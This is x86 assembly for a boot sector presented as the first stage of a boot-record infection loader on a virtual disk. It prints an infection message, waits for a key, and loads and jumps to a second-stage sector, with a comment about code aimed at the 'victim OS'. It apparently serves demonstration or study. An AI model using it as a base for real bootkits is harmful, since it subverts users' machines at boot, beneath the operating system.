; the first stage of our loader

ORG 7c00h      
BITS 16           
jmp boot

msg db 'boot record infection on virtual disk! Press any key to continue',13,10,0  
msg1 db 'failed to read the loader1!',13,10,0

boot:            ; setup the stack
     xor ax,ax
     mov ds,ax
     mov es,ax
     mov ss,ax
     mov sp,7c00h

setup_writing:
     mov ah,0eh
     mov bx,0007
     xor si,si

print_msg:      ; print our msg on the screen
     mov al, [msg+si]    
     test al,al
     jz wait_key
     int 10h             
     inc si 
     jmp print_msg

wait_key:
     mov ah,00h
     int 16h

;; here we could put other code that performs other actions depending of the victim OS

load_loader1: 
     mov dl,80h
     xor ax,ax
     int 13h ; reset drive
     mov es,ax   ; read at    
     mov bx,1000H ; 0000:1000
     mov ah,02h  ; read function
     mov al,01h ; read only one sector
     mov cx,02h ; sector 2
     mov dh,0 
     mov dl,80h    
     int 13h ; read the sector
     jc failed_to_read

jump_to_loader1:
     db 0Eah ; jump at
     dw 1000h ; memory location
     dw 0    ; 0000:1000h

failed_to_read:
     mov ah,0eh
     mov bx,0007
     xor si,si

p:
     mov al, [msg1+si]    
     test al,al
     jz exit
     int 10h             
     inc si
     jmp p

exit:
     ret

times 510-($-$$) db 0    
dw 0aa55h               
